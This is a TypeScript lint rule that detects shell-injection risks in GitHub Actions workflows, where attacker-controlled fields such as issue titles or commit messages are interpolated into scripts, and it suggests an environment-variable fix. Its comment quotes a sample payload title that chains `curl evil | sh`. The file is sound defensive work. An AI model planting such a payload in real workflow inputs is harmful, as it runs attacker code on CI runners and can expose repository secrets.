import type { Finding } from "../types.js";
import type { Step, Workflow } from "../workflow.js";

/**
 * Contexts an attacker controls: issue and PR text, branch names, commit
 * messages and author fields. Interpolating them into a shell script lets a
 * crafted title such as `"; curl evil | sh #` run commands in the runner.
 * Based on GitHub's "Security hardening for GitHub Actions" guide.
 */
const untrusted = [
  /^github\.event\.(issue|pull_request|discussion)\.(title|body)$/,
  /^github\.event\.(comment|review|review_comment)\.body$/,
  /^github\.event\.pull_request\.head\.(ref|label|repo\.default_branch)$/,
  /^github\.event\.pages\[[^\]]*\]\.page_name$/,
  /^github\.event\.pages\.\*\.page_name$/,
  /^github\.event\.commits(\[[^\]]*\]|\.\*)\.(message|author\.(email|name))$/,
  /^github\.event\.head_commit\.(message|author\.(email|name))$/,
  /^github\.event\.workflow_run\.(head_branch|head_commit\.(message|author\.(email|name)))$/,
  /^github\.head_ref$/,
];

const expressionRE = /\$\{\{\s*(.*?)\s*\}\}/g;

export interface Injection {
  /** The full `${{ ... }}` text. */
  text: string;
  /** The context path, e.g. github.event.issue.title. */
  context: string;
}

/** Finds untrusted contexts used directly inside a script. */
export function findInjections(script: string): Injection[] {
  const found: Injection[] = [];
  for (const m of script.matchAll(expressionRE)) {
    const context = (m[1] ?? "").trim();
    if (untrusted.some((re) => re.test(context))) {
      found.push({ text: m[0], context });
    }
  }
  return found;
}

/** Derives an environment variable name: github.event.issue.title -> ISSUE_TITLE. */
export function envName(context: string): string {
  const parts = context
    .replace(/\[[^\]]*\]/g, "")
    .split(".")
    .filter((p) => p !== "github" && p !== "event" && p !== "*");
  const tail = parts.slice(-2).join("_");
  return tail.replace(/[^A-Za-z0-9]+/g, "_").toUpperCase();
}

function scripts(step: Step): { text: string; fixable: boolean }[] {
  const out: { text: string; fixable: boolean }[] = [];
  if (step.run !== undefined) out.push({ text: step.run, fixable: true });
  // actions/github-script evaluates its `script` input as JavaScript.
  const script = step.with.script;
  if (step.uses?.startsWith("actions/github-script@") && script !== undefined) {
    out.push({ text: script, fixable: false });
  }
  return out;
}

export function checkInjection(wf: Workflow): Finding[] {
  const findings: Finding[] = [];
  for (const job of wf.jobs) {
    for (const step of job.steps) {
      for (const { text, fixable } of scripts(step)) {
        for (const inj of findInjections(text)) {
          findings.push({
            ruleId: "GHA001",
            severity: "high",
            file: wf.file,
            line: step.line,
            message: `${inj.context} is interpolated into a script; a crafted value can run arbitrary commands`,
            help: fixable
              ? `Pass it through an environment variable: env: { ${envName(inj.context)}: ${inj.text} } and use "$${envName(inj.context)}" in the script.`
              : "Read it in JavaScript from context.payload instead of interpolating it into the script.",
            fixable,
          });
        }
      }
    }
  }
  return findings;
}
